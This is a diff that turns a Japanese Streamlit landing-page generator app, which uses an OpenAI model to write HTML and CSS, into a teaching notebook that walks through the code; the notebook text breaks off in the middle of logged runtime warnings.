@@ -1,0 +1,1552 @@
+--- app.py	2025-09-15 11:51:27
++++ streamlit_lp.ipynb	2025-09-15 11:31:23
+@@ -1,496 +1,1053 @@
+-# -*- coding: utf-8 -*-
+-"""
+-LPジェネレーター（教材版）
+-- 目的: Streamlitの基本〜中級APIを「公式ドキュメントと突き合わせながら」学ぶ
+-- 依存: pip install -U openai streamlit python-dotenv
+-- 使い方:
+-    1) .env に OPENAI_API_KEY を保存（例: OPENAI_API_KEY=sk-xxxx）
+-    2) streamlit run v3.app.py
+-"""
+-
+-from __future__ import annotations
+-import os, io, re, json, base64, zipfile, random
+-from typing import Dict, List, Tuple
+-
+-import streamlit as st
+-# 公式: set_page_config / 設定関連
+-# https://docs.streamlit.io/develop/api-reference/configuration/st.set_page_config
+-# https://docs.streamlit.io/develop/api-reference/configuration
+-#
+-# 公式: Session State（状態の保持）
+-# https://docs.streamlit.io/develop/api-reference/caching-and-state/st.session_state
+-# https://docs.streamlit.io/develop/concepts/architecture/session-state
+-#
+-# 公式: カスタムHTMLコンポーネント
+-# https://docs.streamlit.io/develop/api-reference/custom-components/st.components.v1.html
+-import streamlit.components.v1 as components
+-
+-from openai import OpenAI
+-from openai import RateLimitError, APIStatusError
+-
+-# 公式: secrets と secrets.toml
+-# https://docs.streamlit.io/develop/api-reference/connections/st.secrets
+-# https://docs.streamlit.io/develop/concepts/connections/secrets-management
+-try:
+-    # .env 読み込み（無ければ何もしない）
+-    from dotenv import load_dotenv
+-    load_dotenv()
+-except Exception:
+-    pass
+-
+-
+-# ────────────────────────────────────────────────────────────────────────────
+-# セクション1: APIキーの取得（教材ポイント: 環境変数優先、secretsは例外安全）
+-# ────────────────────────────────────────────────────────────────────────────
+-def get_api_key(env_key: str = "OPENAI_API_KEY") -> str | None:
+-    """
+-    公式ガイドラインに沿って、まず OS の環境変数を見る。
+-    ローカル開発では .env + python-dotenv で環境変数化するのが安全。
+-    Cloud等で secrets を使う場合は、try/exceptで参照（secrets.toml未配置でも落ちない）。
+-    """
+-    key = os.getenv(env_key)
+-    if key:
+-        return key
+-    try:
+-        return st.secrets[env_key]  # secrets.toml が無い環境では KeyError ではなくパース段階で例外になる可能性 → tryで吸収
+-    except Exception:
+-        return None
+-
+-
+-API_KEY = get_api_key()
+-if not API_KEY:
+-    st.error(
+-        "OpenAI APIキーが見つかりません。\n\n"
+-        "■ 推奨（ローカル学習向け）\n"
+-        "  1) .env を作成し OPENAI_API_KEY=sk-xxxx を記載\n"
+-        "  2) このアプリを再実行\n\n"
+-        "■ 参考（secrets を使う場合）\n"
+-        "  .streamlit/secrets.toml に OPENAI_API_KEY を記載（※リポジトリにコミットしない）\n"
+-        "  公式: st.secrets / secrets.toml の使い方はドキュメント参照"
+-    )
+-    st.stop()
+-
+-client = OpenAI(api_key=API_KEY)
+-
+-
+-# ────────────────────────────────────────────────────────────────────────────
+-# セクション2: ページ設定 / サイドバーUI（教材ポイント: set_page_config・基本ウィジェット）
+-# ────────────────────────────────────────────────────────────────────────────
+-st.set_page_config(
+-    page_title="LPジェネレーター（AI + Editor）",
+-    page_icon="✨",
+-    layout="wide",
+-)
+-
+-st.title("✨ LPジェネレーター（AI生成 + Editor）")
+-st.caption("“毎回ちがうUI”をAIが生成 → 右ペインで色/文字/画像を編集 → AI差分編集 → ZIP出力")
+-
+-with st.sidebar:
+-    st.header("基本情報")
+-    site_title = st.text_input("サイトタイトル / 名前", "Yamada Studio")
+-    tagline    = st.text_input("キャッチコピー", "Design that ships.")
+-    meta_desc  = st.text_input("meta description", "小さく速く出して、継続的に磨くためのデザインと実装。")
+-    email      = st.text_input("連絡先メール", "hello@example.com")
+-
+-    st.divider()
+-    st.header("世界観（テーマ）")
+-    theme = st.selectbox(
+-        "Style Theme（生成AIに渡します）",
+-        [
+-            "シンプル","ビジネス","可愛い","スタイリッシュ","メルヘン","アメコミ風",
+-            "和風","和モダン","ミニマル","未来的（サイバー風）","レトロポップ",
+-            "エレガント","ナチュラル","ダークモード","雑誌風","クール",
+-        ],
+-        index=0
+-    )
+-
+-    st.divider()
+-    st.header("コンテンツ")
+-    about_text   = st.text_area("About本文", height=90, value="大阪を拠点に、スピードと品質を両立するデザイン＆実装を提供しています。小さく出して、早く学び、継続的に磨く。")
+-    features_csv = st.text_input("特徴（カンマ区切り）", "高速検証, 明快なUI, スケール設計, 運用しやすい, 品質とスピード, データドリブン")
+-    works_csv    = st.text_input("実績（カンマ区切り）", "SaaSダッシュボード, EC特集, 採用サイト")
+-    testi_raw    = st.text_area(
+-        "お客様の声（名前|肩書き|コメント を改行）",
+-        height=80,
+-        value="佐藤 花子|PM|意思決定が圧倒的に速くなりました。\n鈴木 次郎|BizDev|初速から質まで、バランスが素晴らしい。"
+-    )
+-
+-    st.divider()
+-    st.header("AI 生成設定")
+-    temperature = st.slider("多様性（temperature）", 0.2, 1.4, 1.0, 0.1)
+-
+-
+-# ────────────────────────────────────────────────────────────────────────────
+-# セクション3: ユーティリティ（教材ポイント: 小さな純粋関数を積む）
+-# ────────────────────────────────────────────────────────────────────────────
+-def _split_csv(s: str) -> List[str]:
+-    return [x.strip() for x in s.split(",") if x.strip()]
+-
+-def _parse_testimonials(s: str) -> List[Dict[str, str]]:
+-    rows: List[Dict[str, str]] = []
+-    for line in s.splitlines():
+-        p = [u.strip() for u in line.split("|")]
+-        if len(p) >= 3:
+-            rows.append({"name": p[0], "role": p[1], "text": "|".join(p[2:])})
+-    return rows
+-
+-def _sanitize_html(html: str) -> str:
+-    # 公式: st.html もサニタイズ注意（DOMPurify）→ 本教材も自前で最低限の除去
+-    # https://docs.streamlit.io/develop/api-reference/text/st.html
+-    html = re.sub(r"(?is)<script.*?>.*?</script>", "", html)
+-    html = re.sub(r'(?is)\son\w+\s*=\s*(["\']).*?\1', "", html)  # onClick 等
+-    return html
+-
+-
+-# ────────────────────────────────────────────────────────────────────────────
+-# セクション4: 生成プロンプトとOpenAI呼び出し（教材ポイント: 例外の扱い）
+-# ────────────────────────────────────────────────────────────────────────────
+-def _build_generate_prompt(theme: str, site_title: str, tagline: str, meta_desc: str,
+-                           email: str, about: str, feats: list, works: list, testi: list, seed: int) -> str:
+-    return f"""
+-あなたはLPデザイナー兼フロントエンドです。以下の要件で “完成HTML/CSS” をゼロから生成してください。
+-
+-# ゴール
+-- 「{theme}」の世界観で、**初見で違いが分かる**LPを作る
+-- **HTMLの構造**・**装飾**・**タイポ**・**余白**・**モーション**まで変える
+-- 外部CDN/JSは使わない（純HTML+CSS）。画像はダミー矩形でOK。
+-
+-# 入力データ
+-- title: {site_title}
+-- tagline: {tagline}
+-- meta_description: {meta_desc}
+-- email: {email}
+-- about: {about}
+-- features: {feats}
+-- works: {works}
+-- testimonials: {testi}
+-- style_seed: {seed}
+-
+-# 厳格仕様
+-- 出力は JSON 1個のみ。スキーマ:
+-  {{
+-    "title": "string",
+-    "meta": {{"description":"string"}},
+-    "css": "string",             // <style>なし、純CSSのみ
+-    "body_html": "string"        // <body>内のみ。<html>/<head>不要
+-  }}
+-
+-# デザイン指針
+-- 同じ {theme} でも毎回**配置・形・装飾**が異なること
+-- セクション数/順序/グリッド/装飾（波形/ステッカー/枠/グロー等）を**毎回変える**
+-- :root で色/角丸/影/線/背景などのトークンを定義
+-- 画像は <div aria-label="image" class="img img--X"> のようなダミー
+-- mailto: のCTAを1つ以上
+-
+-# 禁止
+-- <script>、外部URL、@import、実ファイル画像の読み込み
+-"""
+-
+-def ai_generate(theme: str, site_title: str, tagline: str, meta_desc: str, email: str,
+-                about: str, feats: list, works: list, testi: list, temperature: float) -> Tuple[str, str]:
+-    seed = random.randint(1, 10_000_000)
+-    prompt = _build_generate_prompt(theme, site_title, tagline, meta_desc, email, about, feats, works, testi, seed)
+-    resp = client.chat.completions.create(
+-        model="gpt-4o-mini",
+-        temperature=temperature,
+-        response_format={"type": "json_object"},
+-        messages=[{"role": "user", "content": prompt}],
+-    )
+-    data = json.loads(resp.choices[0].message.content)
+-    css  = data["css"]
+-    body = _sanitize_html(data["body_html"])
+-    return css, body
+-
+-
+-# ────────────────────────────────────────────────────────────────────────────
+-# セクション5: CSSトークン編集(:root)・画像差替え・テキスト編集
+-# ────────────────────────────────────────────────────────────────────────────
+-VAR_RE = re.compile(r":root\s*\{([^}]*)\}", re.S)
+-IMG_PLACEHOLDER_RE = re.compile(
+-    r'(<div[^>]*?(aria-label\s*=\s*"image"[^>]*|class\s*=\s*"[^"]*img[^"]*"[^>]*)>)(.*?)</div>',
+-    re.I | re.S
+-)
+-
+-def extract_root_vars(css_text: str) -> Dict[str, str]:
+-    m = VAR_RE.search(css_text)
+-    if not m: return {}
+-    vars_: Dict[str, str] = {}
+-    for line in m.group(1).split(";"):
+-        if ":" in line:
+-            k, v = line.split(":", 1)
+-            if k.strip().startswith("--") and v.strip():
+-                vars_[k.strip()] = v.strip()
+-    return vars_
+-
+-def replace_root_vars(css_text: str, new_vars: Dict[str, str]) -> str:
+-    def repl(match: re.Match) -> str:
+-        block = match.group(1)
+-        pairs, seen = [], set()
+-        for ln in block.split(";"):
+-            if ":" in ln:
+-                k, v = ln.split(":", 1)
+-                key = k.strip()
+-                if key in new_vars:
+-                    pairs.append(f"{key}: {new_vars[key]}"); seen.add(key)
+-                else:
+-                    pairs.append(f"{key}:{v}")
+-        for k, v in new_vars.items():
+-            if k not in seen: pairs.append(f"{k}: {v}")
+-        return ":root{" + ";".join(pairs) + "}"
+-    if not VAR_RE.search(css_text):
+-        head = ":root{" + ";".join([f"{k}:{v}" for k, v in new_vars.items()]) + "}\n"
+-        return head + css_text
+-    return VAR_RE.sub(repl, css_text, count=1)
+-
+-def find_image_placeholders(html: str) -> List[Tuple[int, str]]:
+-    return [(m.start(), m.group(0)) for m in IMG_PLACEHOLDER_RE.finditer(html)]
+-
+-def data_uri_from_file(file) -> Tuple[str, str]:
+-    # 公式: file_uploader は BytesIO として保持される
+-    # https://docs.streamlit.io/develop/api-reference/widgets/st.file_uploader
+-    # https://docs.streamlit.io/knowledge-base/using-streamlit/where-file-uploader-store-when-deleted
+-    data = file.read()
+-    mime = file.type or "application/octet-stream"
+-    ext = "png"
+-    if "jpeg" in mime: ext = "jpg"
+-    elif "webp" in mime: ext = "webp"
+-    b64 = base64.b64encode(data).decode("ascii")
+-    return f"data:{mime};base64,{b64}", ext
+-
+-def replace_placeholder_with_img(html: str, placeholder_html: str, data_uri: str) -> str:
+-    cls = ""
+-    m = re.search(r'class\s*=\s*"([^"]+)"', placeholder_html, re.I)
+-    if m: cls = m.group(1)
+-    alt = "image"
+-    m2 = re.search(r'aria-label\s*=\s*"([^"]+)"', placeholder_html, re.I)
+-    if m2: alt = m2.group(1)
+-    img = f'<img src="{data_uri}" alt="{alt}" class="{cls}"/>'
+-    return html.replace(placeholder_html, img, 1)
+-
+-def extract_first_h1(html: str) -> str:
+-    m = re.search(r"<h1[^>]*>(.*?)</h1>", html, re.S | re.I)
+-    return (m.group(1).strip() if m else "")
+-
+-def replace_first_h1(html: str, new_text: str) -> str:
+-    return re.sub(r"(<h1[^>]*>)(.*?)(</h1>)", r"\1" + re.escape(new_text) + r"\3",
+-                  html, count=1, flags=re.S | re.I)
+-
+-def extract_subtext(html: str) -> str:
+-    m = re.search(r"<(p|div)\s+class=['\"](sub|lead)['\"][^>]*>(.*?)</\1>", html, re.S | re.I)
+-    return (m.group(3).strip() if m else "")
+-
+-def replace_subtext(html: str, new_text: str) -> str:
+-    return re.sub(r"(<(p|div)\s+class=['\"](sub|lead)['\"][^>]*>)(.*?)(</\2>)",
+-                  r"\1" + re.escape(new_text) + r"\5",
+-                  html, count=1, flags=re.S | re.I)
+-
+-
+-# ────────────────────────────────────────────────────────────────────────────
+-# セクション6: 生成ボタンと Session State（教材ポイント: 再実行に強い設計）
+-# ────────────────────────────────────────────────────────────────────────────
+-if "gen_html" not in st.session_state: st.session_state.gen_html = ""
+-if "gen_css"  not in st.session_state: st.session_state.gen_css  = ""
+-if "img_slots" not in st.session_state: st.session_state.img_slots = []
+-
+-gen_clicked = st.button("🎯 LPを生成（AI）", type="primary")
+-
+-if gen_clicked:
+-    try:
+-        css, body = ai_generate(
+-            theme, site_title, tagline, meta_desc, email,
+-            about_text, _split_csv(features_csv), _split_csv(works_csv), _parse_testimonials(testi_raw),
+-            temperature
+-        )
+-    except RateLimitError as e:
+-        st.error("レート上限/クォータに達しました。"); st.exception(e); st.stop()
+-    except APIStatusError as e:
+-        st.error(f"APIステータスエラー: {e.status_code}"); st.exception(e); st.stop()
+-    except Exception as e:
+-        st.error("AI生成に失敗しました（インストール/キー/モデル権限をご確認ください）。"); st.exception(e); st.stop()
+-
+-    html = f"""<!DOCTYPE html>
+-<html lang="ja">
+-<head>
+-  <meta charset="utf-8" />
+-  <meta name="viewport" content="width=device-width, initial-scale=1" />
+-  <title>{site_title} – Landing</title>
+-  <meta name="description" content="{meta_desc}">
+-  <link rel="stylesheet" href="./styles.css" />
+-</head>
+-<body>
+-{body}
+-</body>
+-</html>"""
+-
+-    st.session_state.gen_html  = html
+-    st.session_state.gen_css   = css
+-    st.session_state.img_slots = find_image_placeholders(body)
+-
+-
+-# ────────────────────────────────────────────────────────────────────────────
+-# セクション7: プレビュー＆エディタ（教材ポイント: components.html / 小さく反映→再描画）
+-# ────────────────────────────────────────────────────────────────────────────
+-if st.session_state.gen_html and st.session_state.gen_css:
+-    colA, colB = st.columns([7, 5])
+-
+-    # プレビュー
+-    with colA:
+-        st.subheader("🔎 プレビュー")
+-        body_only = st.session_state.gen_html.split("<body>", 1)[1].rsplit("</body>", 1)[0]
+-        # 公式: st.components.v1.html（iframeで安全に埋め込み）
+-        # https://docs.streamlit.io/develop/api-reference/custom-components/st.components.v1.html
+-        inline = f"""<!DOCTYPE html><html><head><meta charset='utf-8'>
+-<meta name='viewport' content='width=device-width, initial-scale=1'>
+-<style>{st.session_state.gen_css}</style></head><body>{body_only}</body></html>"""
+-        components.html(inline, height=960, scrolling=True)
+-
+-    # エディタ
+-    with colB:
+-        st.subheader("🛠 エディタ")
+-
+-        # :root 変数編集
+-        vars_now = extract_root_vars(st.session_state.gen_css)
+-        color_keys  = [k for k in vars_now if any(x in vars_now[k] for x in ["#", "rgb", "hsl"])]
+-        radius_keys = [k for k in vars_now if "radius" in k or k == "--r"]
+-
+-        with st.expander("🎨 カラー & トークン編集", expanded=True):
+-            new_vars: Dict[str, str] = {}
+-            for k in color_keys:
+-                v = vars_now[k].strip()
+-                # 公式: color_picker, text_input 等の基本ウィジェットは左のAPIリファレンス一覧からたどれる
+-                new_vars[k] = st.color_picker(k, v) if v.startswith("#") and len(v) in (4, 7) else st.text_input(k, v)
+-            for k in radius_keys:
+-                m = re.search(r"(\d+)", vars_now[k]); init = int(m.group(1)) if m else 12
+-                px = st.slider(f"{k}（px）", 0, 40, init); new_vars[k] = f"{px}px"
+-            if st.button("⬆ CSSに反映"):
+-                st.session_state.gen_css = replace_root_vars(st.session_state.gen_css, new_vars)
+-                st.success("CSS（:root）を更新しました。")
+-
+-        # テキスト編集
+-        with st.expander("✏️ テキスト編集（最初のH1 & サブ）", expanded=False):
+-            curr_body = st.session_state.gen_html.split("<body>", 1)[1].rsplit("</body>", 1)[0]
+-            curr_h1  = extract_first_h1(curr_body)
+-            curr_sub = extract_subtext(curr_body)
+-            new_h1   = st.text_input("H1", curr_h1 or site_title)
+-            new_sub  = st.text_input("サブ（.sub / .lead）", curr_sub or tagline)
+-            if st.button("⬆ テキスト反映"):
+-                body = curr_body
+-                if curr_h1:  body = replace_first_h1(body, new_h1)
+-                if curr_sub: body = replace_subtext(body, new_sub)
+-                st.session_state.gen_html = st.session_state.gen_html.replace(curr_body, body)
+-                st.success("テキストを更新しました。")
+-
+-        # 画像差し替え
+-        with st.expander("🖼 画像差し替え（プレースホルダ）", expanded=False):
+-            # 公式: st.file_uploader
+-            # https://docs.streamlit.io/develop/api-reference/widgets/st.file_uploader
+-            curr_body = st.session_state.gen_html.split("<body>", 1)[1].rsplit("</body>", 1)[0]
+-            if not st.session_state.img_slots:
+-                st.info("プレースホルダ（aria-label=\"image\" または class=\"img ...\"）が見つかりません。")
+-            else:
+-                updated = False
+-                for idx, (_, ph_html) in enumerate(st.session_state.img_slots):
+-                    up = st.file_uploader(f"画像 {idx+1}", type=["png", "jpg", "jpeg", "webp"], key=f"u_{idx}")
+-                    if up is not None:
+-                        data_uri, _ = data_uri_from_file(up)
+-                        curr_body = replace_placeholder_with_img(curr_body, ph_html, data_uri)
+-                        updated = True
+-                if updated:
+-                    st.session_state.gen_html = st.session_state.gen_html.replace(
+-                        st.session_state.gen_html.split("<body>", 1)[1].rsplit("</body>", 1)[0],
+-                        curr_body
+-                    )
+-                    st.session_state.img_slots = find_image_placeholders(curr_body)
+-                    st.success("画像を反映しました。")
+-
+-        # AI差分編集
+-        with st.expander("🤖 AIに指示して再編集（差分適用）", expanded=False):
+-            st.write("例）『ヒーローを左右2カラムに』『可愛い方向に』『角丸20px』『余白を広め』『ネオン感強め』など")
+-            ai_edit_prompt = st.text_area("AIへの指示（日本語でOK）", height=90)
+-
+-            def ai_edit(css_text: str, body_html: str, instruction: str) -> Tuple[str, str]:
+-                sys = "あなたはフロントエンド/デザインの専門家です。安全な純HTML+CSSのみで編集します。"
+-                user = f"""
+-これから与える 'css' と 'body_html' を、指示に従って**直接書き換え**てください。
+-- 返答は JSON 1個、スキーマは {{ "css": "...", "body_html": "..." }} のみ
+-- scriptタグ・外部CDN・@import は禁止
+-- onClick 等の on* は使わない
+-- 画像は既存のダミーdiv/imgを整形（新規読み込み禁止）
+-
+-[現在のCSS]
+-{css_text}
+-
+-[現在のBODY]
+-{body_html}
+-
+-[編集指示]
+-{instruction}
+-"""
+-                resp = client.chat.completions.create(
+-                    model="gpt-4o-mini",
+-                    temperature=0.8,
+-                    response_format={"type": "json_object"},
+-                    messages=[{"role": "system", "content": sys}, {"role": "user", "content": user}],
+-                )
+-                dat = json.loads(resp.choices[0].message.content)
+-                return dat.get("css", ""), _sanitize_html(dat.get("body_html", ""))
+-
+-            if st.button("🪄 指示どおりAIで再編集する"):
+-                try:
+-                    curr_body = st.session_state.gen_html.split("<body>", 1)[1].rsplit("</body>", 1)[0]
+-                    new_css, new_body = ai_edit(
+-                        st.session_state.gen_css,
+-                        curr_body,
+-                        ai_edit_prompt.strip() or "全体を洗練。余白と階層のコントラストを調整。"
+-                    )
+-                    if new_css:
+-                        st.session_state.gen_css = new_css
+-                    if new_body:
+-                        st.session_state.gen_html = st.session_state.gen_html.replace(curr_body, new_body)
+-                        st.session_state.img_slots = find_image_placeholders(new_body)
+-                    st.success("AI差分編集を反映しました。")
+-                except Exception as e:
+-                    st.error("AI差分編集に失敗しました。"); st.exception(e)
+-
+-        # コード / ダウンロード
+-        st.subheader("🧩 生成コード / ダウンロード")
+-        tabs = st.tabs(["index.html", "styles.css"])
+-        with tabs[0]:
+-            st.code(st.session_state.gen_html, language="html")
+-            st.download_button("index.html をDL", st.session_state.gen_html.encode("utf-8"), file_name="index.html")
+-        with tabs[1]:
+-            st.code(st.session_state.gen_css, language="css")
+-            st.download_button("styles.css をDL", st.session_state.gen_css.encode("utf-8"), file_name="styles.css")
+-
+-        # ZIP一括（data URI を assets/ に展開）
+-        def to_zip(html: str, css: str) -> bytes:
+-            buf = io.BytesIO()
+-            with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
+-                html_out = html
+-                matches = re.findall(r'src="data:[^"]+"', html_out)
+-                img_index = 1
+-                for m in matches:
+-                    data_uri = m.split('"', 1)[1].rsplit('"', 1)[0]
+-                    if ";base64," in data_uri:
+-                        head, b64 = data_uri.split(";base64,", 1)
+-                        if "image/png" in head: ext = "png"
+-                        elif "image/webp" in head: ext = "webp"
+-                        elif "image/jpeg" in head or "image/jpg" in head: ext = "jpg"
+-                        else: ext = "png"
+-                        data = base64.b64decode(b64)
+-                        path = f"assets/img_{img_index}.{ext}"
+-                        z.writestr(path, data)
+-                        html_out = html_out.replace(data_uri, "./" + path, 1)
+-                        img_index += 1
+-                z.writestr("index.html", html_out)
+-                z.writestr("styles.css", css)
+-                z.writestr("script.js", "")
+-            buf.seek(0); return buf.getvalue()
+-
+-        st.download_button(
+-            "📦 一括ZIP（Netlify用）",
+-            to_zip(st.session_state.gen_html, st.session_state.gen_css),
+-            file_name="lp_site_ai_editable.zip"
+-        )
+-else:
+-    st.info("左サイドバーを設定して［🎯 LPを生成（AI）］を押してください。生成後に右側で色/テキスト/画像/AI差分編集ができます。")
++{
++ "cells": [
++  {
++   "cell_type": "markdown",
++   "id": "ec6a70d9",
++   "metadata": {},
++   "source": [
++    "\n",
++    "# LPジェネレーター（StreamlitでLPを作る）\n",
++    "\n",
++    "Streamlit 公式ドキュメントを参照しながら、完成済みアプリのコードを1行ずつ理解するための教材です。  \n",
++    "最終成果物は Streamlit アプリ（`app.py`）ですが、ここでは 設計の意図 などのロジック・挙動を確認します。\n",
++    "\n",
++    "---\n",
++    "\n",
++    "## 事前準備（実行環境）\n",
++    "\n",
++    "- 必要パッケージのインストール：  \n",
++    "  ```bash\n",
++    "  pip install -U openai streamlit python-dotenv\n",
++    "  ```\n",
++    "- APIキーの設定：プロジェクト直下の `.env` に以下を記載（API_KEYは任意のものを入力）\n",
++    "  ```\n",
++    "  OPENAI_API_KEY=sk-xxxx\n",
++    "  ```\n",
++    "\n",
++    "> **ポイント**: 実際にアプリを動かすのは **Streamlit** 上です（`streamlit run app.py`）。  \n",
++    "> 本ノートブックは「読みながら理解する教材」で、コードは**学習のために分割**されています。\n"
++   ]
++  },
++  {
++   "cell_type": "markdown",
++   "id": "cd608e8a",
++   "metadata": {},
++   "source": [
++    "\n",
++    "## 📚 公式ドキュメント（よく参照するページ）\n",
++    "\n",
++    "- ページ設定: [`st.set_page_config`](https://docs.streamlit.io/develop/api-reference/configuration/st.set_page_config)\n",
++    "- 設定と構成: [Configuration](https://docs.streamlit.io/develop/api-reference/configuration)\n",
++    "- セッション状態: [`st.session_state`](https://docs.streamlit.io/develop/api-reference/caching-and-state/st.session_state), [Concepts](https://docs.streamlit.io/develop/concepts/architecture/session-state)\n",
++    "- カスタムHTML埋め込み: [`components.html`](https://docs.streamlit.io/develop/api-reference/custom-components/st.components.v1.html)\n",
++    "- `st.html`（挿入時の注意含む）: [`st.html`](https://docs.streamlit.io/develop/api-reference/text/st.html)\n",
++    "- ファイルアップロード: [`st.file_uploader`](https://docs.streamlit.io/develop/api-reference/widgets/st.file_uploader)\n",
++    "- シークレッツ管理: [`st.secrets`](https://docs.streamlit.io/develop/api-reference/connections/st.secrets), [Secrets Management](https://docs.streamlit.io/develop/concepts/connections/secrets-management)\n"
++   ]
++  },
++  {
++   "cell_type": "markdown",
++   "id": "bb9a84b4",
++   "metadata": {},
++   "source": [
++    "\n",
++    "## セクション1：インポート\n",
++    "\n",
++    "- 標準ライブラリ（`os`, `re`, `json` など）\n",
++    "  - from __future__ import annotations → 型ヒントを後から評価できるようにする\n",
++    "  - from typing import Dict, List, Tuple → 辞書・リスト・タプルなどの型を表す\n",
++    "  -  省略可能だが、コード量が多くなるとエディタが補完や警告をしてくれるので、書き間違いを早く見つけられる。\n",
++    "- `streamlit` と `components`  \n",
++    "- `openai` SDK\n",
++    "  - from openai import RateLimitError, APIStatusError … API のエラーを捕捉する例外クラス\n",
++    "    - RateLimitError … 呼び出し上限を超えたとき\n",
++    "    - APIStatusError … サーバー側の不具合（HTTP 500 など）\n",
++    "- `.env` 取り込みのための `python-dotenv`\n"
++   ]
++  },
++  {
++   "cell_type": "code",
++   "execution_count": 14,
++   "id": "04976863",
++   "metadata": {},
++   "outputs": [],
++   "source": [
++    "\n",
++    "from __future__ import annotations\n",
++    "import os, io, re, json, base64, zipfile, random\n",
++    "from typing import Dict, List, Tuple\n",
++    "\n",
++    "import streamlit as st\n",
++    "import streamlit.components.v1 as components\n",
++    "\n",
++    "from openai import OpenAI\n",
++    "from openai import RateLimitError, APIStatusError\n",
++    "\n",
++    "# .env 読み込み（無ければ何もしない）\n",
++    "try:\n",
++    "    from dotenv import load_dotenv\n",
++    "    load_dotenv()\n",
++    "except Exception:\n",
++    "    pass\n"
++   ]
++  },
++  {
++   "cell_type": "markdown",
++   "id": "81f26d94",
++   "metadata": {},
++   "source": [
++    "\n",
++    "## セクション2：APIキー取得の方針\n",
++    "\n",
++    "このセルでは、OpenAI の **API キーを安全に取得** する方法を定義します。\n",
++    "\n",
++    "---\n",
++    "\n",
++    "### キーを探す順序\n",
++    "1. `os.getenv(\"OPENAI_API_KEY\")` を確認  \n",
++    "   → `.env` に書いた値は `python-dotenv` の `load_dotenv()` によって環境変数化されます。\n",
++    "2. 見つからない場合は、`st.secrets` を確認  \n",
++    "   → ここは `.streamlit/secrets.toml` の内容を読み込みます。\n",
++    "\n",
++    "---\n",
++    "\n",
++    "### `secrets.toml` について\n",
++    "- **ローカル学習**では不要（環境変数 or `.env` だけでOK）。  \n",
++    "- **Streamlit Cloud にデプロイ**する場合は、このファイルが必須です。  \n",
++    "  リポジトリ直下に `.streamlit/secrets.toml` を置き、  \n",
++    "  `OPENAI_API_KEY=\"sk-xxxx\"` のようにキーを書きます。\n",
++    "\n",
++    "> ファイルがない環境でもアプリが落ちないように、`try/except` で安全に参照しています。\n",
++    "\n",
++    "---\n",
++    "\n",
++    "💡 **ポイント**\n",
++    "- 「ローカル → .env / 環境変数」  \n",
++    "- 「クラウド → secrets.toml」  \n",
++    "という2段構えにしています。\n",
++    "\n"
++   ]
++  },
++  {
++   "cell_type": "code",
++   "execution_count": 15,
++   "id": "b391fd53",
++   "metadata": {},
++   "outputs": [],
++   "source": [
++    "\n",
++    "def get_api_key(env_key: str = \"OPENAI_API_KEY\") -> str | None:\n",
++    "    # 環境変数優先で API キーを取得。secrets は存在しない環境でも例外にならないように参照。\n",
++    "    key = os.getenv(env_key)\n",
++    "    if key:\n",
++    "        return key\n",
++    "    try:\n",
++    "        return st.secrets[env_key]  # secrets.toml が無い場合もあるため例外安全にする\n",
++    "    except Exception:\n",
++    "        return None\n",
++    "\n",
++    "API_KEY = get_api_key()\n",
++    "if not API_KEY:\n",
++    "    st.error(\n",
++    "        \"OpenAI APIキーが見つかりません。\\n\\n\"\n",
++    "        \"■ 推奨（ローカル学習向け）\\n\"\n",
++    "        \"  1) .env を作成し OPENAI_API_KEY=sk-xxxx を記載\\n\"\n",
++    "        \"  2) このアプリを再実行\\n\\n\"\n",
++    "        \"■ 参考（secrets を使う場合）\\n\"\n",
++    "        \"  .streamlit/secrets.toml に OPENAI_API_KEY を記載（※リポジトリにコミットしない）\\n\"\n",
++    "        \"  公式: st.secrets / secrets.toml の使い方はドキュメント参照\"\n",
++    "    )\n",
++    "    st.stop()\n",
++    "    # ノートブック上では停止しません。実アプリでは st.stop() します。\n",
++    "\n",
++    "client = OpenAI(api_key=API_KEY)\n"
++   ]
++  },
++  {
++   "cell_type": "markdown",
++   "id": "53669566",
++   "metadata": {},
++   "source": [
++    "\n",
++    "## セクション3：ページ設定 & サイドバー UI\n",
++    "\n",
++    "- `st.set_page_config` でタイトル・アイコン・レイアウトを指定\n",
++    "- サイドバーでは、生成に必要な**入力情報**（タイトル、キャッチコピーなど）を設計します\n"
++   ]
++  },
++  {
++   "cell_type": "code",
++   "execution_count": 16,
++   "id": "86f1dcee",
++   "metadata": {},
++   "outputs": [
++    {
++     "name": "stderr",
++     "output_type": "stream",
++     "text": [
++      "2025-09-15 08:26:18.294 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n"
++     ]
++    },
++    {
++     "name": "stderr",
++     "output_type": "stream",
++     "text": [
++      "2025-09-15 08:26:18.312 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.314 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.326 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.331 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.332 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.333 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.335 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.336 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.336 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.338 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.340 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.343 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.346 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.355 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.355 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.357 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 08:26:18.357 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
